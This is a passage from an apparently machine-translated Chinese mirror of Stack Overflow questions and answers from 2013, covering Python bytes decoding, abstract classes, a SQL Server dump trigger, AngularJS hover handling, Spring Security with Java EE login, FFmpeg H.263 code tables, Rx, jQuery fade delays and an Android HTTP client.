    lyrics=urllib.request.urlopen("http://hereIsMyUrl/lyrics.txt")
    text=lyrics.read()
    text=text.replace("\r\n","\n")
    print(text) 
```

我希望它至少会替换一些东西，但它给了我一个运行时错误：

```
 TypeError: expected bytes, bytearray or buffer compatible object 
```

我在互联网上搜索了该错误，但没有找到与从互联网打开文件相关的任何内容。

我已经被困在这一点上几个小时了，不知道如何继续。请帮忙！提前致谢！

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2013-04-02T19:51:39.433

您的示例不起作用，因为`read`语句返回的数据是“字节对象”。您需要使用适当的编码对其进行解码。[`request.urlopen`](http://docs.python.org/3/library/urllib.request.html#urllib.request.urlopen)另请参阅[`file.read`](http://docs.python.org/3/tutorial/inputoutput.html#methods-of-file-objects)和[字节数组操作](http://docs.python.org/3/library/stdtypes.html#bytes-and-bytearray-operations)的文档。

下面给出了一个完整的工作示例：

```
#!/usr/bin/env python3

import urllib.request

# Example URL
url = "http://ntl.matrix.com.br/pfilho/oldies_list/top/lyrics/black_or_white.txt"

# Open URL: returns file-like object
lyrics = urllib.request.urlopen(url)

# Read raw data, this will return a "bytes object"
text = lyrics.read()

# Print raw data
print(text)

# Print decoded data:
print(text.decode('utf-8'))

# If you still need newline conversion, you could use the following
text = text.decode('utf-8')
text = text.replace('\r\n', '\n')
print(text) 
```

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2013-04-02T19:53:56.233

在 Python 3 中，字节的处理方式与文本字符串不同。线后

```
text=lyrics.read() 
```

如果你试试这个

```
print(type(text)) 
```

它返回

```
<class 'bytes'> 
```

所以它不是一个字符串，它是一个字节列表。

当您调用时`text=text.replace("\r\n","\n")`，您正在传递字符串，这就是错误消息的原因。所以你有两个选择。

1.  通过在行后添加此行，将变量“文本”从字节转换为文本 `text=lyrics.read()`。

    ```
    text = text.decode("utf-8") 
    ```

2.  更改`replace`调用以使用字节而不是字符串

    ```
     text=text.replace(b"\r\n",b"\n") 
    ```

我推荐选项 1，以防您对文本进行更多的字符串操作。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-04-02T19:56:55.910

以下适用于我在 Python 3.2 中：

```
import urllib.request
lyrics=urllib.request.urlopen("http://google.com/")
text=str(lyrics.read())
text=text.replace("\r\n","\n")
print(text) 
```

关键区别在于， Lyrics.read() 返回一个字节对象，而不是一个字符串，replace() 不知道如何处理。在执行替换工作之前将其包装在 str() 中。

# python - python中的抽象类是什么？

> ID：15772504
> 
> 赞同：4
> 
> 时间：2013-04-02T19:18:14.290
> 
> 标签：python, class, abstract

在我的在线 python 课程中，我有这个问题：

> 实现一个字触发器抽象类，WordTrigger。它应该接受一个字符串单词作为类的构造函数的参数。

这是作为解决方案发布的：

```
class WordTrigger(Trigger):
    def __init__(self, word):
        self.word = word

    def isWordIn(self, text):  
        import string
        for letter in text:
            if letter in string.punctuation:
                text = text.replace(letter, ' ', 1)
        text = text.lower()
        wordlist = text.split(' ')
        if self.word.lower() in wordlist:
            return True
        return False

# TODO: TitleTrigger
class TitleTrigger(WordTrigger):
    def evaluate(self, story):
        return self.isWordIn(story.getTitle())

# TODO: SubjectTrigger
class SubjectTrigger(WordTrigger):
    def evaluate(self, story):
        return self.isWordIn(story.getSubject()) 
```

我对抽象类的理解是抽象类是一个特殊的类，我们在其中定义要使用的方法而无需任何实现，因此当我们实例化一个对象并尝试访问该方法时，它不会给您带来任何实现错误。

`WordTrigger`抽象类如何？

* * *

## 回答 #1

> 赞同：9
> 
> 时间：2013-04-02T19:39:58.950

## 不是。

恐怕你的在线课程有点拉扯你的链条。他们在那里写的“答案”是简单的继承。如果没有[abc](http://docs.python.org/2/library/abc.html)（抽象基类）模块，就没有真正意义上的“抽象”Python 类，至少在其他语言拥有它的意义上没有。最接近的可能是定义 raise 的方法`NotImplemented`：

```
class BaseClass(object):
    def evaluate(self, story):
        raise NotImplementedError('This is an "abstract" method!') 
```

这样，如果子类想要使用它，至少会使子类覆盖该方法。您可以通过实现其他调用您的“抽象”方法的方法来进一步骚扰您的用户并更接近传统的“抽象类”：

```
# Don't do this!
class BaseClass(object):
    def evaluate(self, story):
        raise NotImplementedError('This is an "abstract" method!')

    def run(self):
        self.evaluate(None) #This will blow up until you implement self.evaluate!
        # ... other code... 
```

这在语法上是可以的，甚至在某些情况下它甚至可以做你想让它做的事情，但一般来说，最好只编写你想要的方法，然后再覆盖它们。尤其如此，因为实际上并不能保证`BaseClass.evaluate`会保持“抽象”：我可以稍后（在定义类之后）来写`BaseClass.evaluate = lambda self, story: None`，这不仅是完全合法的，而且我还可以调用`run`实例`BaseClass`而不遇到`NotImplementedError`. _ 如果可以的话，最好完全远离这种事情。

您的在线课程称他们的课程为`WordTrigger`“抽象”，因为它不包含您在其子类中可能需要的所有方法，但实际上这并没有什么意义——这就像将任何具有子类的类称为“抽象”只是因为它的子类定义了一个新方法。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-04-02T19:20:48.343

查看[ABC 模块](http://docs.python.org/2/library/abc.html)。这使您可以使用抽象方法定义抽象类。作为一种教育练习，您还可以尝试使用元类来实现自己的，但只是重新发明轮子来了解它是如何工作的。

# sql-server - SQL Server - 我需要会导致堆栈转储的代码

> ID：15772507
> 
> 赞同：-1
> 
> 时间：2013-04-02T19:18:21.573
> 
> 标签：sql-server, stack-dump

我正在尝试为 MS 连接项创建一个重现脚本，并且需要能够随意导致堆栈转储。

我怎么能那样做？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-04-02T19:24:15.880

[`DBCC DUMPTRIGGER`](http://blogs.msdn.com/b/psssql/archive/2008/01/10/how-it-works-sql-server-engine-error-messages.aspx)可用于触发特定错误的转储。

您也可以随意进行转储，请参阅[如何使用 Sqldumper.exe 实用程序在 SQL Server 中生成转储文件，](http://support.microsoft.com/kb/917825)但这些用处不大。

# css - 角度：在悬停时更新范围

> ID：15772510
> 
> 赞同：20
> 
> 时间：2013-04-02T19:18:28.083
> 
> 标签：css, angularjs

当您将鼠标悬停在主 div 上时，我希望默认情况下隐藏主 div 的一些子 div。

我正在尝试使用 Angular 来使用原生并忘记`.hover()`jquery 中的方式。

我想`ng-show`在子 div 上使用，然后在悬停主 div 时更新绑定。是否有监听悬停的指令？

* * *

## 回答 #1

> 赞同：52
> 
> 时间：2013-04-02T20:07:58.057

你在正确的轨道上。您实际上可以使用 ngMouseenter 和 ngMouseleave 指令来执行此操作。

```
<span ng-mouseenter="show = true" ng-mouseleave="show = false">
  Mouse over me.
</span>

<div ng-show="show">Hello!</div> 
```

这是一个工作 Plunker：[http ://plnkr.co/edit/Ro80nR7HT7OGGPCXjz7E?p=preview](http://plnkr.co/edit/Ro80nR7HT7OGGPCXjz7E?p=preview)

@Swordfish0321 也是正确的——如果你愿意，你可以编写一个非常简单的指令来专门监听悬停，但这可能不是必需的。[例如，我们在UI Bootstrap](http://angular-ui.github.com/bootstrap)中使用`mouseenter`和`mouseleave`作为工具提示。

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2014-06-16T16:28:58.683

感谢@JoshDavidMiller 提供了非常简洁的答案。我需要在 ng-repeat 中执行此操作，但无法找到一种优雅的方式来执行此操作。在范围上使用布尔值显示列表中所有元素的编辑控件，而不仅仅是我悬停的那个。我几乎弯下腰来抽出`angular.element`（即JQuery）并自己附加悬停处理程序，以便他们可以手动显示悬停元素的控件。我很高兴我没有屈服于这种邪恶的方式。

```
<div ng-repeat="item in items" ng-mouseenter="item.showEdit = true" ng-mouseleave="item.showEdit = false">
    <span class="glyphicon glyphicon-edit" ng-show="item.showEdit"></span>
    Mouse over me.
</div> 
```

只需将属性附加到`item`而不是`$scope`。在某些情况下，我无法将随机键添加到列表中的项目，因此我将数组映射到一个新数组，其中`item`它实际上是包装器对象上的一个属性，然后我可以将我想要的任何属性附加到包装器对象而无需污染`item`钥匙。

# spring - Spring - Java EE 用户在身份验证后仍然为空

> ID：15772512
> 
> 赞同：2
> 
> 时间：2013-04-02T19:18:31.587
> 
> 标签：spring, security, jakarta-ee, spring-security

我是 Java EE / Spring 的新手，过去两天我一直在与安全性作斗争。我终于可以使用 Java EE 进行身份验证并使用 Spring 进行授权了。不幸的是，我无法从 Spring 访问 Java EE 身份验证来进行授权。

该应用程序的总体思路是：

1.  如果你没有登录，Spring security 会将你重定向到登录页面
2.  登录页面是唯一被 Java EE 锁定的页面。它输出一个用于身份验证的表单
3.  成功登录后，用户被重定向到主页，该主页**应该**有与之关联的身份验证对象。

**注意应该**强调，因为它不是。无论出于何种原因，用户都以经过身份验证但匿名的身份返回。如果我可以简单地获取用户名，我可以构建用户详细信息。

这是我的相关片段`web.xml`：

```
<filter>
    <filter-name>springSecurityFilterChain</filter-name>
    <filter-class>org.springframework.web.filter.DelegatingFilterProxy</filter-class>
    </filter>
    <filter-mapping>
        <filter-name>springSecurityFilterChain</filter-name>
        <url-pattern>/*</url-pattern>
    </filter-mapping>
</filter>
<security-constraint>
    <web-resource-collection>
        <web-resource-name>Home Page Only</web-resource-name>
        <description>Rely on Spring for Authorization</description>
        <url-pattern>/login</url-pattern>
    </web-resource-collection>
    <auth-constraint>
        <role-name>*</role-name>
    </auth-constraint>
</security-constraint>
<login-config>
    <auth-method>FORM</auth-method>
    <form-login-config>
        <form-login-page>/login</form-login-page>
        <form-error-page>/loginfailed</form-error-page>
    </form-login-config>
</login-config> 
```

还有我的spring security-content.xml：

```
<?xml version="1.0" encoding="UTF-8"?>
<beans:beans xmlns="http://www.springframework.org/schema/security" 
    xmlns:beans="http://www.springframework.org/schema/beans"
    xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
    xmlns:context="http://www.springframework.org/schema/context" 
    xmlns:lang="http://www.springframework.org/schema/lang"
    xsi:schemaLocation="http://www.springframework.org/schema/beans
        http://www.springframework.org/schema/beans/spring-beans-3.0.xsd
        http://www.springframework.org/schema/security 
        http://www.springframework.org/schema/security/spring-security-3.1.xsd
        http://www.springframework.org/schema/context 
        http://www.springframework.org/schema/context/spring-context-3.1.xsd">

    <http auto-config='true' use-expressions="true">
        <intercept-url pattern="/about" access="permitAll"/>
        <intercept-url pattern="/login" access="permitAll"/>
        <intercept-url pattern="/loginfailed" access="permitAll"/>
        <intercept-url pattern="/css/*" access="permitAll"/>
        <intercept-url pattern="/resources/*" access="permitAll"/>
        <intercept-url pattern="/images/*" access="permitAll"/>
        <intercept-url pattern="/js/*" access="permitAll"/>
        <intercept-url pattern="/**" access="hasRole('ROLE_USER')" />
        <form-login default-target-url='/index.jsp' 
            always-use-default-target='true' login-page="/login"
            authentication-failure-url="/loginfailed"
        />
    </http>
    <authentication-manager alias="authenticationManager">
        <authentication-provider ref="securityRef"/>
    </authentication-manager>
    <beans:bean id="securityRef"
        class="my.custom.authprovider.AuthenticationProviderImpl"/>
</beans:beans> 
```

有任何想法吗？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-02T19:34:40.350

如果您想使用 Java EE 身份验证，您应该配置 PreAuthenticatedProcessingFilter（更准确地说是 J2eePreAuthenticatedProcessingFilter）。此外，您需要配置 J2eeBasedPreAuthenticatedWebAuthenticationDetailsS​​ource 以填充用户授予的权限： [http ://static.springsource.org/spring-security/site/docs/3.1.x/reference/springsecurity-single.html#j2ee-preauth-details](http://static.springsource.org/spring-security/site/docs/3.1.x/reference/springsecurity-single.html#j2ee-preauth-details)

顺便说一句，您认为使用 Java EE 表单身份验证有什么优势？

*在评论后添加。*

如果需要使用 Java EE 身份验证，则应更正您的方法：您应该通过 Java EE 身份验证保护整个应用程序。在这种情况下，到达 Spring Security 的每个请求都将由 Java EE 容器进行身份验证，并且 Spring Security 可以通过 J2eePreAuthenticatedProcessingFilter 对请求进行身份验证。所以修正后的流量

1.  如果用户未登录，Java EE 容器会将用户重定向到登录页面

2.  成功认证后，用户被重定向到受 Spring Security 保护的页面。Spring Security 可以通过 J2eePreAuthenticatedProcessingFilter 对请求进行身份验证。

# c - libavcodec/h263data.h 的这两部分究竟是做什么的？

> ID：15772517
> 
> 赞同：3
> 
> 时间：2013-04-02T19:19:00.483
> 
> 标签：c, ffmpeg, compression, libavcodec, video-codecs

下面是 FFMPEG 库中的两段代码，具体位于此处：libavcodec/h263data.h ( [http://ffmpeg.org/doxygen/0.6/h263data_8h-source.html](http://ffmpeg.org/doxygen/0.6/h263data_8h-source.html) )。

我想更多地了解这两个段如何在编​​解码器库的更大上下文中运行。下面，在这些例子之后，我描述了我到目前为止的理解，并提供了两个更清晰的问题，我希望得到答案。

*感谢您的任何帮助！*

**例 1**

```
00035 /* intra MCBPC, mb_type = (intra), then (intraq) */
00036 const uint8_t ff_h263_intra_MCBPC_code[9] = { 1, 1, 2, 3, 1, 1, 2, 3, 1 };
00037 const uint8_t ff_h263_intra_MCBPC_bits[9] = { 1, 3, 3, 3, 4, 6, 6, 6, 9 }; 
```

**和示例 2**

```
00039 /* inter MCBPC, mb_type = (inter), (intra), (interq), (intraq), (inter4v) */
00040 /* Changed the tables for interq and inter4v+q, following the standard ** Juanjo ** */
00041 const uint8_t ff_h263_inter_MCBPC_code[28] = {
00042     1, 3, 2, 5,
00043     3, 4, 3, 3,
00044     3, 7, 6, 5,
00045     4, 4, 3, 2,
00046     2, 5, 4, 5,
00047     1, 0, 0, 0, /* Stuffing */
00048     2, 12, 14, 15,
00049 }; 
```

我知道我们正在研究影响正交方案的较大压缩算法库的一小部分，这些算法预测“正确”或更恰当地说是“原始”运动间或运动内矢量，在此处表示在名称“ff_h263_inter_MCBPC_code”、“ff_h263_intra_MCBPC_code”和“ff_h263_intra_MCBPC_bits”中。

我知道这两个代码块中的名称划分了以下内容：

1.  **const**指的是一个*只读变量*的声明，它仍然可以像任何其他变量一样在其范围之外使用。以另一种方式表述的不同之处在于，该数组中的值不能被任何在其自身之外调用的方法更改。

2.  **uint8_t**是长度为 8 位的*无符号整数*，是 C99 标准的一部分，称为“固定宽度整数类型”。这种特殊类型，“精确宽度整数”，计算最小值为 0 和最大值为 8 的有符号或无符号位的范围（即 8x8 宏块），它保证了跨平台的这个位数，无论是，比方说，32 位或 64 位操作系统。（我在这里研究了这一点：“固定宽度整数类型” [http://en.wikipedia.org/wiki/Stdint.h#stdint.h](http://en.wikipedia.org/wiki/Stdint.h#stdint.h)）

3.  **MCBPC**指的是色度的宏块类型和编码块模式，但我不完全理解这些特定数组在文件和 libavcodec 的方案中的确切作用。我对概念的理解比这些示例中定义的详细信息/数值要多。

因此，考虑到这一点，这就是我想了解的更多信息：

1.  到目前为止，我的理解是否有任何偏差？

2.  有人可以帮助分解每个代码段的作用吗？**更具体地说，这些数字值在每种情况下表示/做什么？**

3.  “填塞”是什么意思？

再次感谢您在这件事上的任何帮助！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-05T05:32:23.643

让我们从这对数组开始，因为它更短：

```
const uint8_t ff_h263_intra_MCBPC_code[9] = { 1, 1, 2, 3, 1, 1, 2, 3, 1 };
const uint8_t ff_h263_intra_MCBPC_bits[9] = { 1, 3, 3, 3, 4, 6, 6, 6, 9 }; 
```

FFmpeg 将这些输入到 ituh263dec.c 中的这个函数中：

```
INIT_VLC_STATIC(&ff_h263_intra_MCBPC_vlc, INTRA_MCBPC_VLC_BITS, 9,
         ff_h263_intra_MCBPC_bits, 1, 1,
         ff_h263_intra_MCBPC_code, 1, 1, 72); 
```

FFmpeg 使用这些位/代码数组对来设置可变长度代码 (VLC)，也就是霍夫曼代码。在这种情况下，该函数将初始化一个名为 的数据结构`ff_h263_intra_MCBPC_vlc`。每个数组中有 9 个项目的事实意味着有 9 个可能的值 (0..8)。第一项是代码 1 和 1 位长。第二项也是代码 1，但长度为 3。这意味着，在二进制中，它是 001。让我们将其展开：

```
value  code  bitcount  bits
  0      1       1     1
  1      1       3     001
  2      2       3     010
  3      3       3     011
  4      1       4     0001
  5      1       6     000001
  6      2       6     000010
  7      3       6     000011
  8      1       9     000000001 
```

解码器将能够利用`ff_h263_intra_MCBPC_vlc`数据结构，将比特流输入其中并取回一个值，范围从 (0..8)，然后从流中消耗介于 (1..9) 位之间的某个值。

至于您的问题：**“填充”是什么意思？**，请注意，在代码和位数组中，都有为 0 的条目——即代码为 0，并且它的位长为 0。这些是无效值。由于这些数组有 28 个值，范围为 (0..27)。这意味着无法表示 21、22 和 23。

我希望我已经回答了您关于 FFmpeg 如何处理这些数组的机制的问题（我希望这是您查询的主要内容）。

**美图时间：**

Huffman/VLC 代码通常使用树来说明。从顶部开始，0 向左移动，1 向右侧移动。当您到达叶节点时，您已经解码了一个值。

![用于色度 VLC 表的 H.263 帧内宏块编码块模式](https://i.stack.imgur.com/XjT9d.png)

# c# - RX - 自定义 IEqualityComparer 出现明显错误

> ID：15772521
> 
> 赞同：0
> 
> 时间：2013-04-02T19:19:16.887
> 
> 标签：c#, system.reactive

我有一个基于轮询的协议，我想利用 RX 将其转换为基于推送的协议。每隔 x 秒，我使用协议请求标签（名称和值），然后我从中取回它们。

我只对更改标签中的值感兴趣，所以我使用 DistinctUntilChanges 函数。

```
this.TagsChangeNotifier = _tags
    .Select(tag => 
    { 
        return Observable
            .Interval(ts)
            .Select(_ => { return tag; })
            .DistinctUntilChanged(new DataTagComparer()); 
    })
    .Merge(); 
```

这是 DataTagcomparer 类。

```
public class DataTagComparer : IEqualityComparer<DataTag>
{

    public bool Equals(DataTag x, DataTag y)
    {
            b = y.WeakRawValue.ToByteArray().SequenceEqual(x.WeakRawValue.ToByteArray());

        return b;
    }

    public int GetHashCode(DataTag obj)
    {
        return obj.Name.GetHashCode();
    }
} 
```

但看起来无法工作，因为我永远看不到两个不同值之间的比较。这是一个例子。

```
Start program: DataTag("Test",1)
Equals called: x = ("Test",1), y = ("Test",1) 
```

等待 10 秒，然后从协议更改为返回 2 而不是 1。

```
Equals called: x = ("Test",1), y = ("Test",1)
Equals called: x = ("Test",2), y = ("Test",2)
Equals called: x = ("Test",2), y = ("Test",2)
Equals called: x = ("Test",2), y = ("Test",2) 
```

等等。

奇怪的是，它完全没有以前值和当前值之间的比较！你知道可能是什么问题吗？实际上我正在使用这个可怕的解决方法

```
public class DataTagComparer : IEqualityComparer<DataTag>
{

    private object val;

    public bool Equals(DataTag x, DataTag y)
    {
        bool b = true;

        if (val != null)
            b = val.ToByteArray().SequenceEqual(x.WeakRawValue.ToByteArray());

        val = x.WeakRawValue;

        return b;
    }

    public int GetHashCode(DataTag obj)
    {
        return obj.Name.GetHashCode();
    }
} 
```

谢谢你的关注，文森佐。

编辑：DataTag 类代码

```
public abstract class DataTag
{
    public DataTag(string _Name, string Desc)
    {
        Name = _Name;
        Description = Desc;
    }
    public string Name { get; private set; }
    public string Description { get; private set; }
    public abstract object WeakValue { get; }
    public abstract object WeakRawValue { get; }
} 
```

编辑：标签更新功能

```
this.timerHandle = Observable.Interval(ts).Select(_ => { Update(); return _; }).Publish().Connect(); 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-02T23:02:15.393

根据您的描述，这....看起来不正确-尽管我可能会误解您...

```
this.TagsChangeNotifier = _tags
    // for each tag value in tags...
    .Select(tag => 
    { 
        // Tick off every TimeSpan ts, then...
        return Observable.Interval(ts)
            // Say we've "ticked"
            .Do(tick => Console.WriteLine("It's time to tick!"))
            // Return the value "tag" (which remains constant...)
            .Select(_ => { return tag; })
            // Say what we see
            .Do(t => Console.WriteLine("I see a {0}!", t))
            // But only when it's different from the last one
            // (but we never change the value?)
            .DistinctUntilChanged(new DataTagComparer()); 
    })    
    // And mash them all together into one stream
    .Merge(); 
```

我想这一切都取决于是什么`_tags`，在某种程度上取决于定义`DataTag`是什么，但我认为这不是你真正想要的。

编辑：

让我们画出流程 - 从 开始`_tags`，我暂时假设是`IObservable`：

```
Time   _tags
  |    tag1
  |    tag2
  |    tag3 
```

到目前为止，一切都很好 - 现在对于其中的每一个，我们`Select`创建一个`Interval`：

```
Time   _tags
  |    tag1
  |     \---- Interval
  |
  |    tag2
  |     \---- Interval
  |
  |    tag3
  |     \---- Interval
  | 
```

我们打勾了一会儿，每次都重新选择标签：

```
Time   _tags
  |    tag1
  |     \---- Interval
  |            \-------Tick -> tag1
  |            \-------Tick -> tag1
  |            \-------Tick -> tag1
  |    tag2
  |     \---- Interval
  |            \-------Tick -> tag2
  |            \-------Tick -> tag2
  |            \-------Tick -> tag2
  |    tag3
  |     \---- Interval
  |            \-------Tick -> tag3
  |            \-------Tick -> tag3
  |            \-------Tick -> tag3
  | 
```

然后我们添加`DistinctUntilChanged`：

```
Time   _tags
  |    tag1
  |     \---- Interval
  |            \-------Tick -> tag1 ---> tag1
  |            \-------Tick -> tag1 -X
  |            \-------Tick -> tag1 -X
  |    tag2
  |     \---- Interval
  |            \-------Tick -> tag2 ---> tag2
  |            \-------Tick -> tag2 -X
  |            \-------Tick -> tag2 -X
  |    tag3
  |     \---- Interval
  |            \-------Tick -> tag3 ---> tag3
  |            \-------Tick -> tag3 -X
  |            \-------Tick -> tag3 -X
  | 
```

最后`Merge`是子流：

```
Time   _tags                                      Output
  |    tag1                                         |
  |     \---- Interval                              |
  |            \-------Tick -> tag1 ---> tag1       tag1
  |            \-------Tick -> tag1 -X              |
  |            \-------Tick -> tag1 -X              |
  |    tag2                                         |
  |     \---- Interval                              |
  |            \-------Tick -> tag2 ---> tag2       tag2
  |            \-------Tick -> tag2 -X              |
  |            \-------Tick -> tag2 -X              |
  |    tag3                                         |
  |     \---- Interval                              |
  |            \-------Tick -> tag3 ---> tag3       tag3
  |            \-------Tick -> tag3 -X              |
  |            \-------Tick -> tag3 -X              |
  | 
```

因此，如果您需要做的就是捕捉值流发生变化时，您可以尝试如下形状：

```
// my fake source of "tags", in this case simple strings
var subject = new Subject<string>();
var source = subject.Publish().RefCount();

// Still want to track "distinct chains"
var distincts = source.DistinctUntilChanged();
// But we also want to "look into the future", and see the *next* distinct chain
var futureDistincts = source.DistinctUntilChanged().Skip(1);
// A "delta" occurs when a distinct chain ends, so we'll zip the two
// sequences together (since they are "now distinct" and "now + 1", this will mean changes)
var onlyDeltas = distincts
    .Zip(futureDistincts, (before,after) => Tuple.Create(before,after));

using(onlyDeltas.Subscribe(Console.WriteLine))
{
    subject.OnNext("Foo");
    subject.OnNext("Foo");
    subject.OnNext("Foo");
    subject.OnNext("Bar");  // BAM: triggers an output value of (Foo, Bar)
    subject.OnNext("Bar");
    subject.OnNext("Foo"); // BAM: triggers an output value of (Bar, Foo)
} 
```

# plsql - Citrix 上的 PL/SQL Developer 不会更新本地文件上的日期/时间戳

> ID：15772524
> 
> 赞同：1
> 
> 时间：2013-04-02T19:19:22.570
> 
> 标签：plsql, citrix

我在 Citrix 服务器上使用 PL/SQL Developer。我将我的 SQL 文件保存在本地硬盘上，以便对它们进行更多控制。

但是，我注意到，当我修改并保存文件时，更改会保存在本地硬盘驱动器上的 SQL 文件中，但该文件上的日期/时间戳不会更新。所以我有今天早上（2013 年 4 月 2 日上午 10:03）更改的 SQL 文件，但日期/时间戳仍然显示为 2013 年 3 月 22 日下午 4:44

我已经使用 Textpad、UltraEdit 和 Notepad 进行了更改，一切都很好。所以它似乎特定于 PL/SQL Developer。

我还确定 TOAD 和 SQL Developer 也不会更新我的日期/时间戳。

有没有其他人遇到过这个奇怪的问题？

# ant - 带外壳组件的 Worklight ANT

> ID：15772526
> 
> 赞同：0
> 
> 时间：2013-04-02T19:19:27.790
> 
> 标签：ant, ibm-mobilefirst

我有一个使用外壳和内部应用程序的应用程序。有一个 ant 命令来构建应用程序，但没有命令来构建 shell 组件。我在文档中遗漏了什么吗？

谢谢

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-09T06:12:05.463

目前没有用于构建 Shell 组件的 Ant 命令。这只能在 Eclipse 中完成。

我们在我们的跟踪系统中将此作为功能请求。谢谢。

# javascript - 使用jquery延迟加载div

> ID：15772529
> 
> 赞同：1
> 
> 时间：2013-04-02T19:19:31.303
> 
> 标签：javascript, jquery, html, css

这是我的全部代码..我想做的是拥有-。当 DOM 准备好时，第一个 div 显示在页面上，延迟后显示第二个，然后是第三个，依此类推，最多 150。

当前代码的问题在于，整个 150 div 会在一小段延迟后立即加载。

`My code`-

```
<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>Test for dashed div</title>
<style type="text/css">
.dashdiv
{
    width: 150px;
    height: 50px;
    background: #ae2d3e;
    float:left;
    box-shadow: 10px 10px 6px #d4a7b0;
    margin: 5px;
}
</style>
</head>
<body>
    <?php
    for($i =0; $i < 150; $i++)
    {
    ?>
    <div class="dashdiv">
    This is a div text
    </div>
    <?php   
    }
    ?>
<script type="text/javascript" src="http://code.jquery.com/jquery-latest.js"></script>
<script type="text/javascript">
$(document).ready(function(){
    $('div.dashdiv').each(function()
    {
          $(this).hide().delay(1000).fadeIn(1850);
    });
});
</script>   
</body>
</html> 
```

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2013-04-02T23:01:10.353

您面临的问题是，没有人提到，jQuery`delay()`只能在 fx 队列上链接。所以，以后使用它是`hide()`行不通的。使其工作的快速解决方法是使用效果代替`hide()`，即：

```
$('div.dashdiv').each(function(i) {
  $(this).fadeOut(0).delay(1000*i).fadeIn(1850);
}); 
```

* * *

## 回答 #2

> 赞同：5
> 
> 时间：2013-04-02T19:21:51.837

尝试使用`index`为 的每次迭代自动分配的参数`each`以线性方式延长延迟：

```
$('div.dashdiv').each(function(i) {
   $(this).delay(1000*i).fadeIn(1850);
}); 
```

此外，根据您的评论，`div`应更改元素的样式以使其隐藏：

```
.dashdiv {
    display:none;
    ...
} 
```

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2013-04-02T19:24:50.613

您可以使用 ：

html:

```
<div id="parent">
    <div class="child"></div>
    <div class="child"></div>
    <div class="child"></div>
    <div class="child"></div>
</div> 
```

jQuery：

```
$('#parent .child')
    .hide()
    .each(function(index){
        var _this = this;
        setTimeout( function(){ $(_this).fadeIn(); }, 5000*index );
    }); 
```

演示在[http://jsfiddle.net/gaby/eGWx9/1/](http://jsfiddle.net/gaby/eGWx9/1/)

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2013-04-02T19:54:03.160

这是一种`div`仅在前一个`div`完成后才延迟和淡入的方法。它使用 fadeIn 回调移动到数组中的下一个 div：

```
// hide all
$('.dashdiv').hide();

// fade in each div one by one
divs = document.getElementsByClassName('dashdiv');
(function fade(i){
    if(i < divs.length){
        $(divs[i]).delay(1000).fadeIn(1850, function(){
            fade(++i);
        });
    }
})(0); 
```

或者没有`getElementsByClassName`。

```
// hide all
$('.dashdiv').hide();

// fade in each div one by one
(function fade(i){
    if(i < $('.dashdiv').length){
        $($('.dashdiv')[i]).delay(1000).fadeIn(1850, function(){
            fade(++i);
        });
    }
})(0); 
```

演示：http: [//jsfiddle.net/louisbros/RdxS6/](http://jsfiddle.net/louisbros/RdxS6/)

# php - 安卓+php+mysql

> ID：15772533
> 
> 赞同：1
> 
> 时间：2013-04-02T19:19:50.000
> 
> 标签：php, android, mysql, error-handling

我正在创建一个可以访问外部数据库以检索一些数据的移动应用程序，但问题出在 logcat 我得到错误任何人都可以帮助我，我将不胜感激

# TestExternalDatabaseActivity.java

```
package com.taseen.apps;

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.io.UnsupportedEncodingException;

import org.apache.http.HttpEntity;
import org.apache.http.HttpResponse;
import org.apache.http.client.ClientProtocolException;
import org.apache.http.client.HttpClient;
import org.apache.http.client.methods.HttpPost;
import org.apache.http.impl.client.DefaultHttpClient;
import org.apache.http.impl.conn.DefaultClientConnection;
import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

import android.R.array;
import android.os.Bundle;
import android.app.Activity;
import android.util.Log;
import android.view.Menu;
import android.widget.TextView;

public class TestExternalDatabaseActivity extends Activity {

    TextView resultView;
    @Override
    public void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.testexternaldatabase);

    resultView =(TextView)findViewById(R.id.result);
    getData();

    }

   public void getData() 
   {
       String  result = "";
       InputStream isr = null;

       try {
        HttpClient httpclient = new DefaultHttpClient();
           HttpPost httppost = new  HttpPost("127.0.0.2/getAllCustomers.php");
           HttpResponse response  = httpclient.execute(httppost);
           HttpEntity entity = response.getEntity();
           try {
            isr = entity.getContent();
        } catch (IllegalStateException e4) {
            // TODO Auto-generated catch block
            e4.printStackTrace();
        } catch (IOException e) {
            // TODO Auto-generated catch block
            e.printStackTrace();
        }
    } catch (ClientProtocolException e) {
        // TODO Auto-generated catch block
        Log.e("log-tag", "Error in  connection"+e.toString());
        resultView.setText("could not connect to database");

        //convert response to string 

        try {
            BufferedReader reader = new  BufferedReader(new InputStreamReader(isr, "iso-8859-1"),8);
            StringBuilder sb = new StringBuilder();
            String line = null;
            while((line = reader.readLine())!= null)
            {
                sb.append(line + "\n");

            }
            isr.close();

            result = sb.toString();
        } catch (UnsupportedEncodingException e1) {
            // TODO Auto-generated catch block
            Log.e("Log-tag", "Error converting  result" +e.toString());

    //parse json data

            try {
                String s ="";
                JSONArray jArray = new JSONArray(result);

                for(int i = 0; i<jArray.length(); i++)
                {
                    JSONObject json = jArray.getJSONObject(i);
                    s =  s +
                            "Name: "+json.getString("FirstName")+" "+json.getString("LastName")+"\n"+
                            "Age: "+json.getString("Age")+"\n"+
                            "Mobile Used: "+json.getString("Mobile")+"\n\n";

                }

                resultView.setText(s);
            } catch (JSONException e2) {
                // TODO Auto-generated catch block
                Log.e("log-tag", "Error parsing data"+e.toString());
            }

    } catch (IOException e3) {
            // TODO Auto-generated catch block
            e3.printStackTrace();
        }

   } catch (IOException e5) {
        // TODO Auto-generated catch block
        e5.printStackTrace();
    }

  }
} 
```

# 日志猫：

```
